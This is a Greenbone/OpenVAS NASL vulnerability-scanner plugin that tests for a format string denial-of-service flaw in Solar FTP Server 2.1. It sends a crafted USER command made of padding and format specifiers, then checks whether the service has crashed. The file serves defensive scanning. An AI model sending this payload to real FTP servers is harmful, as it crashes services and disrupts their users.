if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802001" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-03-04 14:32:35 +0100 (Fri, 04 Mar 2011)" );
	script_bugtraq_id( 46504 );
	script_tag( name: "cvss_base", value: "8.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:S/C:C/I:C/A:C" );
	script_name( "SolarFTP USER Command Remote Denial of Service Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/solarftp/detected" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/42834" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/65574" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/16204" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/98647/solarftp-dos.txt" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to cause a
  denial of service." );
	script_tag( name: "affected", value: "Flexbyte Software Solar FTP Server 2.1, other versions may also
  be affected." );
	script_tag( name: "insight", value: "The flaw is due to format string error while parsing 'USER'
  command, which can be exploited to crash the FTP service by sending 'USER'
  command with an overly long username parameter." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running SolarFTP Server and is prone to denial of
  service vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "Solar FTP Server" )){
	exit( 0 );
}
soc = open_sock_tcp( ftpPort );
if(!soc){
	exit( 0 );
}
resp = ftp_recv_line( socket: soc );
if(!resp || !ContainsString( resp, "Solar FTP Server" )){
	ftp_close( socket: soc );
	exit( 0 );
}
attackReq = crap( data: raw_string( 0x41 ), length: 50 ) + "%x%lf%f%d%c%s%c%u%n%s%c%lf%tt%d%c";
attack = NASLString( "USER ", attackReq, "\\r\\n" );
send( socket: soc, data: attack );
resp = recv_line( socket: soc, length: 260 );
ftp_close( socket: soc );
soc1 = open_sock_tcp( ftpPort );
if(!soc1){
	security_message( port: ftpPort );
	exit( 0 );
}
resp = recv_line( socket: soc1, length: 100 );
ftp_close( socket: soc1 );
if(!resp || !ContainsString( resp, "Solar FTP Server" )){
	security_message( port: ftpPort );
	exit( 0 );
}

